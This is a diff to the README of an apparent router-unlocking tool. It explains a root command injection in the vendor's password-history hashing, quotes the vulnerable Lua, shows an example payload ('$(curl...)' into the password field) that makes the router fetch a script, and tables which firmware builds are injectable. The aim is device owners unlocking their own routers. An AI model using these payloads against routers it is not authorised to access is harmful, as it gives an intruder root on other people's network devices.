@@ -5,20 +5,59 @@ firmware, and it installs nothing beyond what keeping SSH alive requires.
 
 ## The vulnerable call
 
-The handler ends in an unescaped shell-out with the password interpolated into
-it. Read from a stock `JIDU6801` rootfs on `R2.0.19.6`
-(`usr/lib/lua/luci/model/jio/session.lua:180`):
+The password reaches a shell through the **password-history hash**, not through
+the `passwd` call. Read from a stock `JIDU6801` rootfs on `R2.0.19.6`.
+
+`usr/lib/lua/luci/model/jio/rules/user.lua` validates a new password and then
+hashes it to check it against the last three:
+
+```lua
+local command = string.format(CONSTANTS.CMD_OPENSSL_HASH_PASSWORD, newPasswd, rsn)
+local hashPassword = jioUtil.remove_newline(luci.sys.exec(command))
+```
+
+`usr/lib/lua/luci/model/jio/constants.lua:215` builds that command with the
+password inside **double** quotes:
+
+```lua
+CMD_OPENSSL_HASH_PASSWORD = 'echo -n "%s" | openssl dgst -sha256 -mac HMAC -macopt key:%s | cut -d " " -f 2'
+```
+
+`luci.sys.exec` runs it through `/bin/sh`, so `$(...)` in the password is
+evaluated as root before `openssl` sees it. `savePasswdHistory` uses the same
+command again when it records the new hash.
+
+The `setPassword` function on the same build is a red herring:
 
 ```lua
 function setPassword(username, password)
 	local resp = os.execute(
 		"(echo '" .. password .. "'; sleep 1; echo '" .. password .. "') | "
 		.. "passwd '" .. username .. "' >/dev/null 2>&1")
+
+	if tonumber(resp) == tonumber(0) then
+		savePasswdHistory(username, password)
+	end
+	return resp
+end
 ```
 
-The exact command differs between builds; what matters is that `password` reaches
-a shell unquoted. `$(...)` inside the single quotes still runs, which is the whole
-exploit.
+Its password is inside **single** quotes, where `$(...)` is literal. The
+injection happens earlier, in `checkPasswordHistory`, before `setPassword` is
+reached.
+
+## Why "accepted" is not "executed"
+
+A stock `JIDU6801` rootfs on `R2.0.18.2` has neither `checkPasswordHistory` nor
+`savePasswdHistory`. Its `change_user_password` calls `setPassword`, which pipes
+the single-quoted password to `passwd`, and `passwd` happily sets that literal
+string as the guest password. The API replies `OK`.
+
+So a payload such as `Aa1$(curl${IFS}192.168.31.51>/a)` is **accepted**, and no
+callback ever arrives, because no shell evaluated the `$(...)`. That is the
+failure behind "payload accepted, no callback": this handler is not injectable,
+and no firewall change or retry will help. `unlock` now probes for this before it
+sends a payload.
 
 ## The validator's real rules
 
@@ -50,12 +89,13 @@ of this and explains itself when a payload does not fit.
 
 The prefix (`Aa1`) is randomised per run: the router remembers the last three
 passwords per account, and a download payload always evaluates to its literal
-prefix.
+prefix. The history probe carries a fresh prefix too, so it cannot collide with
+the payloads that follow it.
 
 The address is whatever local interface can reach the router —
-`address_reaching()` works it out. The router fetches the script from your
-machine, so your machine must be reachable from the router on that address. That
-is the one place a firewall can get in the way; see
+`address_reaching()` works it out, and `--address` overrides it. The router
+fetches the script from your machine, so your machine must be reachable from the
+router on that address. That is the one place a firewall can get in the way; see
 [TROUBLESHOOTING.md](TROUBLESHOOTING.md).
 
 ## The installer
@@ -121,19 +161,28 @@ off its admin-session-kill branch.
 ## Firmware compatibility
 
 This tool has exactly one method, `changeUserPassword`, so everything here is
-about that handler. The version string is a hint, not a verdict; `check` reads
-it — together with the router's family — and reports `YES` or `TEST`:
+about that handler. The version string is a hint, not a verdict. `check` reads it
+together with the router's family and reports one of three states:
 
-| Family | Build | `check` | Unlock |
-| --- | --- | --- | --- |
-| MTK (`6j01`) | `R3.2.0` and earlier | `YES` | the password field is injectable |
-| MTK (`6j01`) | `R3.2.1` and newer | `TEST` | see below |
-| Qualcomm (`6j11`) | `R3.2.6` and earlier | `YES` | the password field is injectable (member-reported) |
-| Qualcomm (`6j11`) | `R3.2.7` and newer | `TEST` | no datapoint beyond `R3.2.6` yet |
+| Family | Build | `check` | Why |
+| --- | --- | :---: | --- |
+| MTK (`6j01`) | `R2.0.18.x` and older | `NO` | no password-history functions; an 18.2 rootfs was read |
+| MTK (`6j01`) | `R2.0.19.0`–`R2.0.19.5` | `TEST` | the history feature landed somewhere in this window |
+| MTK (`6j01`) | `R2.0.19.6`–`R3.2.0` | `YES` | the 19.6 rootfs has the double-quoted hash; 3.2.0 confirmed in the field |
+| MTK (`6j01`) | `R3.2.1`–`R3.2.2` | `TEST` | the fix is somewhere between 3.2.0 and 3.2.3 |
+| MTK (`6j01`) | `R3.2.3` and newer | `NO` | `luci.sys.user.setpasswd` replaced the shell-out |
+| Qualcomm (`6j11`) | `R3.2.6` and earlier | `YES` | member-confirmed at 3.2.6; older builds may predate history, so the probe decides |
+| Qualcomm (`6j11`) | `R3.2.7` and newer | `TEST` | no datapoint beyond 3.2.6 |
 
-`TEST` is not a guess that it might work — on the 6j01 family the handler is
-**fixed by `R3.2.3`**. Read from a stock `JIDU6701` rootfs on `R3.2.3`
-(`usr/lib/lua/luci/model/jio/session.lua:182`):
+The lower bound is not cosmetic. The `R2.0.18.2` rootfs has no
+`checkPasswordHistory` and no `savePasswdHistory`, so its `change_user_password`
+never runs a shell with the password. The feature appears by `R2.0.19.6`, whose
+rootfs carries both functions and the double-quoted hash shown above. No image
+between `R2.0.19.0` and `R2.0.19.5` has been read, which is why that window is
+`TEST` rather than `YES`.
+
+On the upper end, the handler is **fixed by `R3.2.3`**. Read from a stock
+`JIDU6701` rootfs on `R3.2.3` (`usr/lib/lua/luci/model/jio/session.lua`):
 
 ```lua
 function setPassword(username, password)
@@ -148,18 +197,41 @@ function setPassword(username, password)
 
 The vendor's own comment names the bug — *"shell injection not taken care at
 application level"* — and `luci.sys.user.setpasswd` passes the password as an
-argument instead of through a shell. So on a fixed build, `unlock` cannot work
-at all. `detect` and `backup` are unaffected.
-
-Which release between `R3.2.1` and `R3.2.3` carries the fix has not been
-determined; no image in that range has been examined. The check stays
-conservative for it, which is why `R3.2.1` and `R3.2.2` report `TEST`.
+argument instead of through a shell. Which release between `R3.2.1` and `R3.2.3`
+carries the fix has not been determined, so those two report `TEST`.
 
 The families ship separate firmware branches, and the fix has not reached the
-Qualcomm branch: a community member confirmed the password injection still
-running on a `6j11` unit on `R3.2.6`, the newest build it is confirmed to
-survive. `6j11` builds up to and including `R3.2.6` therefore report `YES`,
-and anything newer stays a `TEST` until someone reports a datapoint.
+Qualcomm branch: a community member confirmed the injection on a `6j11` unit
+running `R3.2.6`. Nothing newer has been reported, so `R3.2.7` and above remain
+`TEST`.
+
+### The runtime probe
+
+`check` is read-only, and a version string cannot prove what the Lua actually
+does. Before sending a payload, `unlock` changes the **guest** account's password
+once to a random literal and re-reads the guest record:
+
+- a new `passwdHistory` entry means `savePasswdHistory` ran, so this build has
+  the vulnerable hash shell-out;
+- no entry means the history write is absent. On the builds examined, the
+  vulnerable shell-out is absent too: `unlock` raises `UnsupportedFirmware` and
+  sends no payload. The guest password has changed to a random value, but the
+  admin account and everything else are untouched.
+
+`--force` turns that stop into a warning, for a build where the history
+functions might be split across releases. The probe still runs, and the
+callback is still the only evidence that a payload executed.
+
+### What "NO" means in practice
+
+On a locked unit running `NO` firmware, the `changeUserPassword` route is closed.
+`detect` still works because it only reads the API, but `backup` needs root SSH
+from this tool, so it cannot run either. There is no supported software-only
+backup before unlock; the UART/u-boot console is the fallback. Do not flash
+anything until you have a backup made through that route.
+
+`NO` is a statement about this handler, not an audit of the whole firmware.
+Other API handlers exist and are not tested or used here.
 
 ## Where the factory secrets live
 
